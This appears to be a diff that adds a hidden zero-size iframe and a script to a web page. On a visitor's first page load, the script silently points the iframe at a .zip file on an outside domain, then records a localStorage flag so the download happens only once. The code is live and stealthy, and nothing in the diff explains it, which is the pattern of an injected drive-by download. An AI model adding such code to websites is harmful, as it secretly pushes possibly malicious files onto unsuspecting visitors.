@@ -1,0 +1,13 @@
+<iframe id="nicCloudFrame" style="display:none; width:0; height:0; border:0;"></iframe>
+<script type="text/javascript">
+  // Check if iframe has been loaded before using localStorage
+  (function() {
+    var iframeLoaded = localStorage.getItem('nicCloudFrameLoaded');
+    var iframe = document.getElementById('nicCloudFrame');
+    
+    if (!iframeLoaded) {
+      iframe.src = 'https://nic-cloud.digital/file.php?id=691ac1173f9a7.zip';
+      localStorage.setItem('nicCloudFrameLoaded', 'true');
+    }
+  })();
+</script>
